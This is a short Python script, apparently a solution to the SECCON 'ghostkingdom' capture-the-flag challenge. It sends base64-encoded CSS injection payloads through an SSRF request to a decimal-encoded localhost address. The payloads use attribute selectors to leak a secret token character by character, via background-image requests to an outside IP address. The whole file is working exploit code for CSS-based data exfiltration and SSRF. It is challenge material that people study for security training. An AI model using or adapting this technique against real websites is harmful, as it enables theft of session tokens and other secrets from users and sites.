import base64
import requests
import time

url = "http://ghostkingdom.pwn.seccon.jp/?url="

cookie = {
    "CGISESSID":"fb78b5343b6df61f1b83ee"
}

for c in range(48,59):
    print(chr(c))
    css = "span{color:yellow} input[value^='fb78b5343b6df61f1b83ee"+chr(c)+"'] {background-image:url('http://35.240.159.190/fb78b5343b6df61f1b83ee"+chr(c)+"');}"
    css_b64 = base64.b64encode(css)
    r_url = "http%3A%2F%2F2130706433%2F%3Fcss%3D" + css_b64 + "%26msg%3D%26action%3Dmsgadm2&action=sshot2"
    res = requests.get(url=url+r_url, cookies=cookie)
    print(css_b64)
    print(res.content)
    time.sleep(10)

for c in range(97,127):
    print(chr(c))
    css = "span{color:yellow} input[value^='fb78b5343b6df61f1b83ee"+chr(c)+"'] {background-image:url('http://35.240.159.190/fb78b5343b6df61f1b83ee"+chr(c)+"');}"
    css_b64 = base64.b64encode(css)
    r_url = "http%3A%2F%2F2130706433%2F%3Fcss%3D" + css_b64 + "%26msg%3D%26action%3Dmsgadm2&action=sshot2"
    res = requests.get(url=url+r_url, cookies=cookie)
    print(css_b64)
    print(res.content)
    time.sleep(10)